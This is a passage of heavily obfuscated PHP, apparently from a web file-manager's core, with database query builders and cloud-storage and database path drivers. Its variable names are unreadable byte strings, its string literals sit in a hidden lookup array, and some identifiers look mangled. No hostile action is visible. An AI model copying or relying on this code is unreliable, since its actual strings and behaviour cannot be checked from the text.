$this->parseSet($‘ùÔßºÉ) . $this->parseWhere(!empty($íÊÄî§[$±ıé¿ïÅ[365]]) ? $íÊÄî§[$±ıé¿ïÅ[365]] : $±ıé¿ïÅ[12]) . $this->parseOrder(!empty($íÊÄî§[$±ıé¿ïÅ[453]]) ? $íÊÄî§[$±ıé¿ïÅ[453]] : $±ıé¿ïÅ[12]) . $this->parseLimit(!empty($íÊÄî§[$±ıé¿ïÅ[380]]) ? $íÊÄî§[$±ıé¿ïÅ[380]] : $±ıé¿ïÅ[12]) . $this->parseLock(isset($íÊÄî§[$±ıé¿ïÅ[956]]) ? $íÊÄî§[$±ıé¿ïÅ[956]] : !1) . $this->parseComment(!empty($íÊÄî§[$±ıé¿ïÅ[441]]) ? $íÊÄî§[$±ıé¿ïÅ[441]] : $±ıé¿ïÅ[12]); return $this->execute($ĞŞüÚ´î, $this->parseBind(!empty($íÊÄî§[$±ıé¿ïÅ[373]]) ? $íÊÄî§[$±ıé¿ïÅ[373]] : array())); } public function delete($ÚÕäéÍ¦ = array()) { $Äü°ˆ¶¾ =& $_SERVER[¤øïŠ‹²]; $this->model = $ÚÕäéÍ¦[$Äü°ˆ¶¾[371]]; $ù®…»ğ§ = $Äü°ˆ¶¾[1158] . $this->parseTable($ÚÕäéÍ¦[$Äü°ˆ¶¾[369]]) . $this->parseWhere(!empty($ÚÕäéÍ¦[$Äü°ˆ¶¾[365]]) ? $ÚÕäéÍ¦[$Äü°ˆ¶¾[365]] : $Äü°ˆ¶¾[12]) . $this->parseOrder(!empty($ÚÕäéÍ¦[$Äü°ˆ¶¾[453]]) ? $ÚÕäéÍ¦[$Äü°ˆ¶¾[453]] : $Äü°ˆ¶¾[12]) . $this->parseLimit(!empty($ÚÕäéÍ¦[$Äü°ˆ¶¾[380]]) ? $ÚÕäéÍ¦[$Äü°ˆ¶¾[380]] : $Äü°ˆ¶¾[12]) . $this->parseLock(isset($ÚÕäéÍ¦[$Äü°ˆ¶¾[956]]) ? $ÚÕäéÍ¦[$Äü°ˆ¶¾[956]] : !1) . $this->parseComment(!empty($ÚÕäéÍ¦[$Äü°ˆ¶¾[441]]) ? $ÚÕäéÍ¦[$Äü°ˆ¶¾[441]] : $Äü°ˆ¶¾[12]); return $this->execute($ù®…»ğ§, $this->parseBind(!empty($ÚÕäéÍ¦[$Äü°ˆ¶¾[373]]) ? $ÚÕäéÍ¦[$Äü°ˆ¶¾[373]] : array())); } public function select($ŒÍÉ‚àŒ = array()) { $ÑŞ² ëø =& $_SERVER[¤øïŠ‹²]; $this->model = $ŒÍÉ‚àŒ[$ÑŞ² ëø[371]]; $¡áŠ‰±Ş = $this->buildSelectSql($ŒÍÉ‚àŒ); $ úğğé› = isset($ŒÍÉ‚àŒ[$ÑŞ² ëø[436]]) ? $ŒÍÉ‚àŒ[$ÑŞ² ëø[436]] : !1; if ($ úğğé›) { $…“Ñ‹‹‚ = is_string($ úğğé›[$ÑŞ² ëø[106]]) ? $ úğğé›[$ÑŞ² ëø[106]] : $ÑŞ² ëø[1159] . md5($¡áŠ‰±Ş); $ÜËõŞÑ = think_cache($…“Ñ‹‹‚, $ÑŞ² ëø[12], $ úğğé›); if (!1 !== $ÜËõŞÑ) { return $ÜËõŞÑ; } } $¿Øİ¥Úñ = $this->query($¡áŠ‰±Ş, $this->parseBind(!empty($ŒÍÉ‚àŒ[$ÑŞ² ëø[373]]) ? $ŒÍÉ‚àŒ[$ÑŞ² ëø[373]] : array())); if ($ úğğé› && !1 !== $¿Øİ¥Úñ) { think_cache($…“Ñ‹‹‚, $¿Øİ¥Úñ, $ úğğé›); } return $¿Øİ¥Úñ; } public function buildSelectSql($æ·ª´Ä = array()) { $¹¸Æà×ß =& $_SERVER[¤øïŠ‹²]; if (isset($æ·ª´Ä[$¹¸Æà×ß[440]])) { if (strpos($æ·ª´Ä[$¹¸Æà×ß[440]], $¹¸Æà×ß[50])) { list($–Ö¢¬´, $úÈà¢‡) = explode($¹¸Æà×ß[50], $æ·ª´Ä[$¹¸Æà×ß[440]]); } else { $–Ö¢¬´ = $æ·ª´Ä[$¹¸Æà×ß[440]]; } $–Ö¢¬´ = $–Ö¢¬´ ? $–Ö¢¬´ : 1; $úÈà¢‡ = isset($úÈà¢‡) ? $úÈà¢‡ : (is_numeric($æ·ª´Ä[$¹¸Æà×ß[380]]) ? $æ·ª´Ä[$¹¸Æà×ß[380]] : 20); $¢¹ş¥ø  = $úÈà¢‡ * ((int) $–Ö¢¬´ - 1); $æ·ª´Ä[$¹¸Æà×ß[380]] = $¢¹ş¥ø  . $¹¸Æà×ß[50] . $úÈà¢‡; } if (think_config($¹¸Æà×ß[1160])) { $»³Ò¯ı = $¹¸Æà×ß[1161] . md5(serialize($æ·ª´Ä)); $‡”Í¹œ— = think_cache($»³Ò¯ı); if ($‡”Í¹œ—) { return $‡”Í¹œ—; } } $åñÕã² = $this->parseSql($this->selectSql, $æ·ª´Ä); $åñÕã² .= $this->parseLock(isset($æ·ª´Ä[$¹¸Æà×ß[956]]) ? $æ·ª´Ä[$¹¸Æà×ß[956]] : !1); if (isset($»³Ò¯ı)) { think_cache($»³Ò¯ı, $åñÕã²); } return $åñÕã²; } public function parseSql($‚øéçá, $É²œ„„« = array()) { $À¦ÙÔ‡ô =& $_SERVER[¤øïŠ‹²]; $‚øéçá = str_replace(array($À¦ÙÔ‡ô[1162], $À¦ÙÔ‡ô[1163], $À¦ÙÔ‡ô[1164], $À¦ÙÔ‡ô[1165], $À¦ÙÔ‡ô[1166], $À¦ÙÔ‡ô[1167], $À¦ÙÔ‡ô[1168], $À¦ÙÔ‡ô[1169], $À¦ÙÔ‡ô[1170], $À¦ÙÔ‡ô[1171], $À¦ÙÔ‡ô[1172]), array($this->parseTable("{$É²œ„„«[$À¦ÙÔ‡ô[369]]}"), $this->parseDistinct(isset($É²œ„„«[$À¦ÙÔ‡ô[1173]]) ? $É²œ„„«[$À¦ÙÔ‡ô[1173]] : !1), $this->parseField(!empty($É²œ„„«[$À¦ÙÔ‡ô[363]]) ? $É²œ„„«[$À¦ÙÔ‡ô[363]] : $À¦ÙÔ‡ô[233]), $this->parseJoin(!empty($É²œ„„«[$À¦ÙÔ‡ô[372]]) ? $É²œ„„«[$À¦ÙÔ‡ô[372]] : $À¦ÙÔ‡ô[12]), $this->parseWhere(!empty($É²œ„„«[$À¦ÙÔ‡ô[365]]) ? $É²œ„„«[$À¦ÙÔ‡ô[365]] : $À¦ÙÔ‡ô[12]), $this->parseGroup(!empty($É²œ„„«[$À¦ÙÔ‡ô[604]]) ? $É²œ„„«[$À¦ÙÔ‡ô[604]] : $À¦ÙÔ‡ô[12]), $this->parseHaving(!empty($É²œ„„«[$À¦ÙÔ‡ô[1174]]) ? $É²œ„„«[$À¦ÙÔ‡ô[1174]] : $À¦ÙÔ‡ô[12]), $this->parseOrder(!empty($É²œ„„«[$À¦ÙÔ‡ô[453]]) ? $É²œ„„«[$À¦ÙÔ‡ô[453]] : $À¦ÙÔ‡ô[12]), $this->parseLimit(!empty($É²œ„„«[$À¦ÙÔ‡ô[380]]) ? $É²œ„„«[$À¦ÙÔ‡ô[380]] : $À¦ÙÔ‡ô[12]), $this->parseUnion(!empty($É²œ„„«[$À¦ÙÔ‡ô[434]]) ? $É²œ„„«[$À¦ÙÔ‡ô[434]] : $À¦ÙÔ‡ô[12]), $this->parseComment(!empty($É²œ„„«[$À¦ÙÔ‡ô[441]]) ? $É²œ„„«[$À¦ÙÔ‡ô[441]] : $À¦ÙÔ‡ô[12])), $‚øéçá); return $‚øéçá; } public function getLastSql($ÁËå‡ÒÉ = '') { return $ÁËå‡ÒÉ ? $this->modelSql[$ÁËå‡ÒÉ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($à‡¯±í) { return addslashes($à‡¯±í); } public function setModel($¯šÂ¸úµ) { $this->model = $¯šÂ¸úµ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto cÄà¢ …’ñ; FÔŠç¦åÆ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Ñç‘¶»é) { parent::__construct($Ñç‘¶»é); $this->setSignVersion($_SERVER[¤øïŠ‹²][260]); } public function uploadFormData($Íïçƒ, $¥½ÂéÚà = 3600) { $ûş–¶×Ø =& $_SERVER[¤øïŠ‹²]; $äĞÈŠâ = $ûş–¶×Ø[242]; $×Ë•Œå = $ûş–¶×Ø[1473]; $¢öŞùÁ = $ûş–¶×Ø[274]; $†‰ªÓ ò = gmdate($ûş–¶×Ø[1474], time() + $¥½ÂéÚà); $­Û”â = (string) time() . $ûş–¶×Ø[85] . (string) (time() + $¥½ÂéÚà); $ÖÓó»Ê = array($ûş–¶×Ø[275] => $†‰ªÓ ò, $ûş–¶×Ø[278] => array(array($ûş–¶×Ø[318] => $äĞÈŠâ), array($ûş–¶×Ø[279] => $this->bucket), array($ûş–¶×Ø[280], $ûş–¶×Ø[281], $ûş–¶×Ø[12]), array($ûş–¶×Ø[283] => $¢öŞùÁ), array($ûş–¶×Ø[1475] => $×Ë•Œå), array($ûş–¶×Ø[1476] => $this->accessKey), array($ûş–¶×Ø[1477] => $­Û”â))); $ÖÓó»Ê = json_encode($ÖÓó»Ê); $Õ•ƒ½ùå = hash_hmac($ûş–¶×Ø[1473], $­Û”â, $this->secret); $–ôªÒü = sha1($ÖÓó»Ê); $±ÔÑØÖ¬ = hash_hmac($ûş–¶×Ø[1473], $–ôªÒü, $Õ•ƒ½ùå); $®õÑä˜å = array($ûş–¶×Ø[318] => $äĞÈŠâ, $ûş–¶×Ø[283] => $¢öŞùÁ, $ûş–¶×Ø[290] => base64_encode($ÖÓó»Ê), $ûş–¶×Ø[1475] => $×Ë•Œå, $ûş–¶×Ø[1476] => $this->accessKey, $ûş–¶×Ø[1478] => $­Û”â, $ûş–¶×Ø[1479] => $±ÔÑØÖ¬, $ûş–¶×Ø[219] => $this->getHost()); return $®õÑä˜å; } public function fileOutImage($¼Ğ™›á, $öíŸÙ¤” = 250) { $³ˆ›Û· =& $_SERVER[¤øïŠ‹²]; if ($this->size($¼Ğ™›á) > 1024 * 1024 * 32) { return $this->fileOutImageServer($¼Ğ™›á, $öíŸÙ¤”); } $¶Ã‹ÕÈ = $this->link($¼Ğ™›á); $¶Ã‹ÕÈ .= $³ˆ›Û·[1480] . $öíŸÙ¤” . $³ˆ›Û·[1481]; $this->fileOutLink($¶Ã‹ÕÈ); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($‡Ò’Æ¡±) { $this->pathParse = $‡Ò’Æ¡±; $this->model = Model($_SERVER[¤øïŠ‹²][1482]); } public function getPath($ì×„”Î) { return trim($ì×„”Î, $_SERVER[¤øïŠ‹²][8]); } public function pathFather($õ“´ûµ) { $‡¶¤ç”í = $this->parse($õ“´ûµ); $‡¶¤ç”í = $this->infoSimple($õ“´ûµ); return $‡¶¤ç”í ? $‡¶¤ç”í[$_SERVER[¤øïŠ‹²][203]] : !1; } public function pathThis($Áäè”ç¨) { $äÆªÍÍ = $this->infoSimple($Áäè”ç¨); return $äÆªÍÍ ? $äÆªÍÍ[$_SERVER[¤øïŠ‹²][32]] : !1; } public function getPathOuter($ù£º‡Ğá) { if (!$ù£º‡Ğá) { return $ù£º‡Ğá; } $ê–„ş¾ = $this->parse($ù£º‡Ğá); return KodIO::make($ê–„ş¾[$_SERVER[¤øïŠ‹²][493]]); } public function copyFolderFromIO($¥¶—Ìğ¶, $ÊÖÒì‚, $ş„ÑĞî‡, $Ëí‘¿óÄ, $‡Î…¬ ‚) { $ˆıá§ó× = $this->model->copyFolderFromIO($¥¶—Ìğ¶, $ÊÖÒì‚, $ş„ÑĞî‡, $Ëí‘¿óÄ, $‡Î…¬ ‚); return KodIO::make($ˆıá§ó×); } public function isParentOf($§ÔÜÑ½, $±şóô­Ç) { return $this->model->isParentOf($§ÔÜÑ½, $±şóô­Ç); } public function mkfile($»ñŒÀØÔ, $•ìªÍ”Ï = '', $ÙÅÈÙ = REPEAT_RENAME) { $°‡Àèàø =& $_SERVER[¤øïŠ‹²]; $½çôò¥¸ = $this->parse($»ñŒÀØÔ); $»ñŒÀØÔ = $½çôò¥¸[$°‡Àèàø[493]]; for ($’¸Á’‹ù = 0; $’¸Á’‹ù < count($½çôò¥¸[$°‡Àèàø[1483]]); $’¸Á’‹ù++) { $ª«¤ßÕ› = $½çôò¥¸[$°‡Àèàø[1483]][$’¸Á’‹ù]; if ($’¸Á’‹ù == count($½çôò¥¸[$°‡Àèàø[1483]]) - 1) { $»ñŒÀØÔ = $this->model->mkfile($»ñŒÀØÔ, $ª«¤ßÕ›, $•ìªÍ”Ï, $ÙÅÈÙ); break; } $»ñŒÀØÔ = $this->model->mkdir($»ñŒÀØÔ, $ª«¤ßÕ›, REPEAT_SKIP); } return $this->getPathOuter($»ñŒÀØÔ); } public function mkdir($†ÓŒ×™˜, $² Ààæ = REPEAT_SKIP) { $Å¾ÈÌœğ =& $_SERVER[¤øïŠ‹²]; $”˜²ƒ = $this->parse($†ÓŒ×™˜); $†ÓŒ×™˜ = $”˜²ƒ[$Å¾ÈÌœğ[493]]; for ($ÇÛ²Õ¦ò = 0; $ÇÛ²Õ¦ò < count($”˜²ƒ[$Å¾ÈÌœğ[1483]]); $ÇÛ²Õ¦ò++) { $ÏğÂÄ×Â = $”˜²ƒ[$Å¾ÈÌœğ[1483]][$ÇÛ²Õ¦ò]; $†ÓŒ×™˜ = $this->model->mkdir($†ÓŒ×™˜, $ÏğÂÄ×Â, $² Ààæ); } return $this->getPathOuter($†ÓŒ×™˜); } public function copyFile($É“ñ–»‘, $¢®ÊÀè˜, $¶ğ†ôºš = REPEAT_REPLACE) { $Š‡Ç´» =& $_SERVER[¤øïŠ‹²]; $†º¾¶è = $this->parse($¢®ÊÀè˜); $·È©ë¾„ = $this->model->copy($É“ñ–»‘, $†º¾¶è[$Š‡Ç´»[493]], $¶ğ†ôºš, $†º¾¶è[$Š‡Ç´»[98]]); return $·È©ë¾„ ? $this->getPathOuter($·È©ë¾„) : !1; } public function moveFile($ššºşÇ¸, $ÕÁÖ¯¹, $…óøŠâ = REPEAT_REPLACE) { $ùÕÛ’“ş =& $_SERVER[¤øïŠ‹²]; $€óá™‚ = $this->parse($ÕÁÖ¯¹); $Ù‰³¹çª = $this->model->move($ššºşÇ¸, $€óá™‚[$ùÕÛ’“ş[493]], $…óøŠâ, $€óá™‚[$ùÕÛ’“ş[98]]); return $Ù‰³¹çª ? $this->getPathOuter($Ù‰³¹çª) : !1; } public function copy($€Õˆ¸Ü—, $ÓËÁ—Ñ¤, $§Œ˜ä¨ = REPEAT_REPLACE, $Ö…Šµü­ = false) { $½Õ’Åçì = $this->parse($ÓËÁ—Ñ¤); $°›ËøÙ = $this->model->copy($€Õˆ¸Ü—, $½Õ’Åçì[$_SERVER[¤øïŠ‹²][493]], $§Œ˜ä¨, $Ö…Šµü­); return $°›ËøÙ ? $this->getPathOuter($°›ËøÙ) : !1; } public function moveSameAllow() { } public function move($»¤š”Ëõ, $Ÿİ¯¹¥Ş, $¤èØáë  = REPEAT_REPLACE, $œŞÎúá‚ = false) { $À³Û–…„ = $this->parse($Ÿİ¯¹¥Ş); $ÔÆ…ÌŒ¼ = $this->model->move($»¤š”Ëõ, $À³Û–…„[$_SERVER[¤øïŠ‹²][493]], $¤èØáë , $œŞÎúá‚); return $ÔÆ…ÌŒ¼ ? $this->getPathOuter($ÔÆ…ÌŒ¼) : !1; } public function remove($—áñ’ÒÎ, $šâº£ğ = true) { return $this->model->remove($—áñ’ÒÎ, $šâº£ğ); } public function rename($ƒ£‹âó¼, $”êù­Ã¿) { $Â¼ŒÛÄ¾ = $this->model->rename($ƒ£‹âó¼, $”êù­Ã¿); return $Â¼ŒÛÄ¾ ? $this->getPathOuter($ƒ£‹âó¼) : $Â¼ŒÛÄ¾; } public function size($¹Úò¯ëˆ) { $×ÕûöŠ¹ = $this->infoSimple($¹Úò¯ëˆ); return $×ÕûöŠ¹ ? $×ÕûöŠ¹[$_SERVER[¤øïŠ‹²][90]] : 0; } public function infoSimple($Ÿ¼ò±Ú¦) { return $this->model->sourceInfo($Ÿ¼ò±Ú¦); } public function info($ùûí¢¢ş) { return $this->infoParse($ùûí¢¢ş); } public function infoAuth($ı¾”°À) { return $this->infoParse($ı¾”°À, !1, !0); } public function infoWithChildren($ËŸèÂàÑ) { return $this->infoParse($ËŸèÂàÑ, !0); } protected function infoParse($¡©âüŒ—, $Í®°âÍ‚ = false, $…³¹ıøª = false) { if (!$Í®°âÍ‚) { return $this->model->pathInfo($¡©âüŒ—, $…³¹ıøª); } return $this->model->pathInfoMore($¡©âüŒ—); } public function infoFullSimple($áŸ±å™®) { $Ãú™¾¤ =& $_SERVER[¤øïŠ‹²]; $ñğ½ä  = explode($Ãú™¾¤[8], $áŸ±å™®); $èôáÏó = implode($Ãú™¾¤[8], array_splice($ñğ½ä , 1)); return $this->model->pathInfoByPath($ñğ½ä [0], $èôáÏó); } public function infoFull($­«’‹ÏŠ) { $Ñ¢ÈÙ©Ç = $this->infoFullSimple($­«’‹ÏŠ); return is_array($Ñ¢ÈÙ©Ç) ? $this->model->pathInfo($Ñ¢ÈÙ©Ç[$_SERVER[¤øïŠ‹²][204]]) : !1; } public function hashSimple($ßÊş¹Ì ) { $‰äÉÁÅš =& $_SERVER[¤øïŠ‹²]; $°¾†Â“å = $this->infoWithChildren($ßÊş¹Ì ); return $°¾†Â“å[$‰äÉÁÅš[180]][$‰äÉÁÅš[701]]; } public function hashMd5($ù÷ˆê¬´) { $ì¶áé =& $_SERVER[¤øïŠ‹²]; $—’æå²Ê = $this->infoWithChildren($ù÷ˆê¬´); return $—’æå²Ê[$ì¶áé[180]][$ì¶áé[569]]; } public function exist($›š¸œ¦¶) { $ÓæÁ”ƒı =& $_SERVER[¤øïŠ‹²]; $³Ğø”º = $this->parse($›š¸œ¦¶); if (!$³Ğø”º[$ÓæÁ”ƒı[98]]) { return $this->isFile($›š¸œ¦¶) || $this->isFolder($›š¸œ¦¶); } $˜×–è¹™ = array($ÓæÁ”ƒı[498] => $³Ğø”º[$ÓæÁ”ƒı[493]], $ÓæÁ”ƒı[32] => $³Ğø”º[$ÓæÁ”ƒı[98]]); $ÜÒ­øë¦ = $this->model->where($˜×–è¹™)->find(); return $ÜÒ­øë¦ ? !0 : !1; } public function isFile($êØíœü) { $š×ŸÑı =& $_SERVER[¤øïŠ‹²]; $Ú¦†öİ¥ = $this->infoSimple($êØíœü); return $Ú¦†öİ¥ && $Ú¦†öİ¥[$š×ŸÑı[506]] == $š×ŸÑı[241] ? !0 : !1; } public function isFolder($ Û÷Áâ¥) { $¦øÙş =& $_SERVER[¤øïŠ‹²]; $Š®Ìú„‚ = $this->infoSimple($ Û÷Áâ¥); return $Š®Ìú„‚ && $Š®Ìú„‚[$¦øÙş[506]] == $¦øÙş[102] ? !0 : !1; } public function listPath($’°ğµª±, $Œ”¾ï•ô = false) { $—Æ¨ªñô =& $_SERVER[¤øïŠ‹²]; if ($’°ğµª± == $—Æ¨ªñô[12]) { return !1; } $¹ˆ¼Çôï = array($—Æ¨ªñô[498] => $’°ğµª±); if ($Œ”¾ï•ô) { return $this->model->listSource($¹ˆ¼Çôï, -1); } return $this->model->listSource($¹ˆ¼Çôï); } public function has($ó‡¼º…, $Ïã“è“Ö = false, $ê”Ç“Ù¶ = null) { $‰Ì¬´ğ =& $_SERVER[¤øïŠ‹²]; $µŠ¥×ü = $this->infoWithChildren($ó‡¼º…); if ($Ïã“è“Ö) { return array($‰Ì¬´ğ[253] => $µŠ¥×ü[$‰Ì¬´ğ[253]], $‰Ì¬´ğ[252] => $µŠ¥×ü[$‰Ì¬´ğ[252]]); } return $ê”Ç“Ù¶ ? $µŠ¥×ü[$‰Ì¬´ğ[253]] : $µŠ¥×ü[$‰Ì¬´ğ[252]]; } public function listAll($´äºÔ¤É) { $Î¥ù ® = IO::info($this->pathParse[$_SERVER[¤øïŠ‹²][98]]); if (!$Î¥ù ®) { return array(); } return $this->model->listAll($´äºÔ¤É); } public function getContent($¥Œ«Œ‘·) { return $this->model->getContent($¥Œ«Œ‘·); } public function setContent($öÁçµ“‡, $šáŠÍË = '') { return $this->model->setContent($öÁçµ“‡, $šáŠÍË); } public function fileSubstr($æåÄ­¹ƒ, $şÔÖÌ, $‰–Ì¯Öš) { return $this->model->fileSubstr($æåÄ­¹ƒ, $şÔÖÌ, $‰–Ì¯Öš); } public function download($Äé¢ùÎÜ, $ë÷ŒÎíî = '') { $ÀÃšòâğ = get_path_father($ë÷ŒÎíî); $ç«š±÷ = get_path_this($ë÷ŒÎíî); $Å³°‡‹œ = $this->model->fileInfoGet($Äé¢ùÎÜ); $­‡Ö¿çƒ = IO::copy($Å³°‡‹œ[$_SERVER[¤øïŠ‹²][98]], $ÀÃšòâğ, !1, $ç«š±÷); return $­‡Ö¿çƒ; } public function setModifyTime($ÈëÛïçÆ, $Ú¹‚‰„Ô = '') { $äÃÈÅë =& $_SERVER[¤øïŠ‹²]; if (!$ÈëÛïçÆ) { return; } $this->model->where(array($äÃÈÅë[512] => $ÈëÛïçÆ))->save(array($äÃÈÅë[99] => $Ú¹‚‰„Ô)); } public function upload($“É²íÇÏ, $©ĞßÜ–™, $¹»é¼ = false, $Ô–›ôáØ = REPEAT_REPLACE) { $è½­øíò =& $_SERVER[¤øïŠ‹²]; $Œ—ü•ñÀ = $this->parse($“É²íÇÏ); $Ê§¶ •¬ = $this->model->addFile($Œ—ü•ñÀ[$è½­øíò[493]], $©ĞßÜ–™, $Œ—ü•ñÀ[$è½­øíò[98]], $¹»é¼, $Ô–›ôáØ); return $this->getPathOuter($Ê§¶ •¬); } public function uploadFileByID($›í®ëÁ’, $¦Ğ÷¯ä, $µñ¤©šŸ) { $Ÿ…ò–Üœ =& $_SERVER[¤øïŠ‹²]; $Û¿øÔµ = $this->parse($›í®ëÁ’); $Û¸šóşŸ = $this->model->addFileByFileID($Û¿øÔµ[$Ÿ…ò–Üœ[493]], $¦Ğ÷¯ä, $Û¿øÔµ[$Ÿ…ò–Üœ[98]], $µñ¤©šŸ); return $this->getPathOuter($Û¸šóşŸ); } public function addFileByRemote($Ç¾®ºÂŞ, $ôœ°ÁŞò, $Ã »®¶¡ = array(), $¹ÂÆÊò = '', $¶•ˆÜ) { $ÇåªıÌ =& $_SERVER[¤øïŠ‹²]; $Ñ”É”é£ = $this->parse($Ç¾®ºÂŞ); $¹ÂÆÊò = empty($¹ÂÆÊò) ? $Ñ”É”é£[$ÇåªıÌ[98]] : $¹ÂÆÊò; $×–šÑƒé = $this->model->addFileByRemote($Ñ”É”é£[$ÇåªıÌ[493]], $ôœ°ÁŞò, $¹ÂÆÊò, $Ã »®¶¡, $¶•ˆÜ); return $this->getPathOuter($×–šÑƒé); } public function uploadLink($ÕÊÚÒšé, $òñ·Šºš = 0) { $¥¯·Ô„” =& $_SERVER[¤øïŠ‹²]; $»‹ñ¦ª = $this->parse($ÕÊÚÒšé); $Âóú“ Ú = _get($GLOBALS[$¥¯·Ô„”[7]], $¥¯·Ô„”[1484]); $óì‡€œ‚ = _get($GLOBALS[$¥¯·Ô„”[7]], $¥¯·Ô„”[1485]); $‡Äşû¤· = KodIO::ioFileDriverGet($¥¯·Ô„”[504] . $»‹ñ¦ª[$¥¯·Ô„”[493]] . $¥¯·Ô„”[414]); $€ÖÌÏà = Model($¥¯·Ô„”[703])->createFileName($»‹ñ¦ª[$¥¯·Ô„”[98]], $‡Äşû¤·, $Âóú“ Ú, $óì‡€œ‚); return IO::uploadLink($€ÖÌÏà, $òñ·Šºš); } public function fileNameAuto($®éäàÆò, $…ä¿Âå­, $İş¤ĞÀ = REPEAT_REPLACE, $­ĞØ§ª = false) { return $this->model->fileNameAuto($®éäàÆò, $…ä¿Âå­, $İş¤ĞÀ, $­ĞØ§ª); } public function fileNameExist($£”Á…ä, $Îàôû’Ä) { return $this->model->fileNameExist($£”Á…ä, $Îàôû’Ä); } protected function _fileOut($»ÎıïÎô, $ØØ½ÔìÄ = false, $ª»ÚÁ­– = false, $ş„Ã†ïí = '', $ö‰’ÙÒç = false) { $ŸÛ¸èî =& $_SERVER[¤øïŠ‹²]; $„ÁÁ¦Ğ = $this->model->sourceInfo($»ÎıïÎô); if ($„ÁÁ¦Ğ[$ŸÛ¸èî[506]] == $ŸÛ¸èî[102]) { header($ŸÛ¸èî[1486]); die; } $ºß‰İŸ½ = $this->model->fileInfoGet($»ÎıïÎô); $ş„Ã†ïí = $ºß‰İŸ½[$ŸÛ¸èî[569]] ? $ºß‰İŸ½[$ŸÛ¸èî[569]] : $ş„Ã†ïí; $µñ¾ê‘ğ = isset($GLOBALS[$ŸÛ¸èî[193]]) && is_array($GLOBALS[$ŸÛ¸èî[193]]) ? $GLOBALS[$ŸÛ¸èî[193]][$ŸÛ¸èî[32]] : $„ÁÁ¦Ğ[$ŸÛ¸èî[32]]; if ($ö‰’ÙÒç) { return IO::fileOutServer($ºß‰İŸ½[$ŸÛ¸èî[98]], $ØØ½ÔìÄ, $µñ¾ê‘ğ, $ş„Ã†ïí); } IO::fileOut($ºß‰İŸ½[$ŸÛ¸èî[98]], $ØØ½ÔìÄ, $µñ¾ê‘ğ, $ş„Ã†ïí); } public function fileOut($¡ÇÇ²¨, $ÀÜèãØ = false, $¾Ùş¶Í = false, $Ñ¯¶™İä = '') { $this->_fileOut($¡ÇÇ²¨, $ÀÜèãØ, $¾Ùş¶Í, $Ñ¯¶™İä); } public function fileOutServer($ÇÓá¸åö, $ã÷ÌöÌå = false, $©•÷âÙ = false, $½Ğ„ôØ¥ = '') { $this->_fileOut($ÇÓá¸åö, $ã÷ÌöÌå, $©•÷âÙ, $½Ğ„ôØ¥, !0); } protected function _fileOutImage($ò·½™¼, $×˜Ôóû = 250) { $¤¤éöø‘ =& $_SERVER[¤øïŠ‹²]; $éÂæüÇé = $this->model->pathInfo($ò·½™¼); if ($éÂæüÇé[$¤¤éöø‘[506]] == $¤¤éöø‘[102]) { show_json($¤¤éöø‘[1487] . $ò·½™¼, !1); } $¼ú„éÌ = $this->model->fileInfoGet($ò·½™¼); $éÂæüÇé[$¤¤éöø‘[194]] = $¼ú„éÌ[$¤¤éöø‘[98]]; $GLOBALS[$¤¤éöø‘[193]] = $éÂæüÇé; IO::fileOutImage($¼ú„éÌ[$¤¤éöø‘[98]], $×˜Ôóû); } public function fileOutImage($¤â³Ø³—, $„ä½£«• = 250) { $this->_fileOutImage($¤â³Ø³—, $„ä½£«•); } public function fileOutImageServer($Êàş×óŞ, $òÒçû±Œ = 250) { $this->_fileOutImage($Êàş×óŞ, $òÒçû±Œ); } public function link($¥â£çÅÈ, $¯§‚¼Ş³ = '') { $åŸâÏÎ· = $this->model->fileInfoGet($¥â£çÅÈ); return IO::link($åŸâÏÎ·[$_SERVER[¤øïŠ‹²][98]], $¯§‚¼Ş³); } protected function parse($È£²Âíş) { $³˜éÁ¢¡ =& $_SERVER[¤øïŠ‹²]; if (strstr($È£²Âíş, $³˜éÁ¢¡[8]) === !1) { return array($³˜éÁ¢¡[514] => intval($È£²Âíş), $³˜éÁ¢¡[98] => $³˜éÁ¢¡[12], $³˜éÁ¢¡[1483] => array()); } $Ò‘› = explode($³˜éÁ¢¡[8], trim($È£²Âíş, $³˜éÁ¢¡[8])); if (count($Ò‘›) < 2) { show_tips(clear_html($È£²Âíş) . $³˜éÁ¢¡[1488]); } return array($³˜éÁ¢¡[514] => intval($Ò‘›[0]), $³˜éÁ¢¡[98] => $Ò‘›[1], $³˜éÁ¢¡[1483] => array_slice($Ò‘›, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ÃŒ¾±Ú‹) { $this->pathParse = $ÃŒ¾±Ú‹; $this->model = Model($_SERVER[¤øïŠ‹²][1482]); } public function getPathRoot() { $Û«Æ¾ùÛ =& $_SERVER[¤øïŠ‹²]; return KodIO::makeShare($this->pathParse[$Û«Æ¾ùÛ[493]], $this->pathParse[$Û«Æ¾ùÛ[1306]]); } public function getPathOuter($¾»ÉçÌ) { $àËßã½“ =& $_SERVER[¤øïŠ‹²]; if (!$¾»ÉçÌ) { return $¾»ÉçÌ; } $Ï•ßìúö = $this->parse($¾»ÉçÌ); return trim(KodIO::makeShare($this->pathParse[$àËßã½“[493]], $Ï•ßìúö[$àËßã½“[493]]), $àËßã½“[8]); } public function isParentOf($£û¯ì÷´, $†Ÿ¯ğñ½) { $Å¹‹Ú¯Í = IO::init($†Ÿ¯ğñ½); return $this->model->isParentOf($£û¯ì÷´, $Å¹‹Ú¯Í->path); } protected function infoParse($ïŠ†¸Şü, $ÆíÇ¢•… = false, $òàÍ–É¼ = false) { $òÆâáÜ— =& $_SERVER[¤øïŠ‹²]; static $ìÒ¥¶æâ = array(); $À› ˆà = $this->pathParse[$òÆâáÜ—[493]]; $¨Ççã½ = trim($this->pathParse[$òÆâáÜ—[1302]], $òÆâáÜ—[8]); if (isset($ìÒ¥¶æâ[$¨Ççã½]) && is_array($ìÒ¥¶æâ[$¨Ççã½])) { return $ìÒ¥¶æâ[$¨Ççã½]; } $»êÎ¢¿ = Action($òÆâáÜ—[1489])->sharePathInfo($À› ˆà, $¨Ççã½, $ÆíÇ¢•…); $ìÒ¥¶æâ[$¨Ççã½] = $»êÎ¢¿; return $»êÎ¢¿; } public function infoFull($üÊÙşÑ×) { $“„½ò‰´ =& $_SERVER[¤øïŠ‹²]; $õôçˆ¥ü = explode($“„½ò‰´[8], trim($üÊÙşÑ×, $“„½ò‰´[8])); if (count($õôçˆ¥ü) > 1) { $Û¤Ùö‡Í = 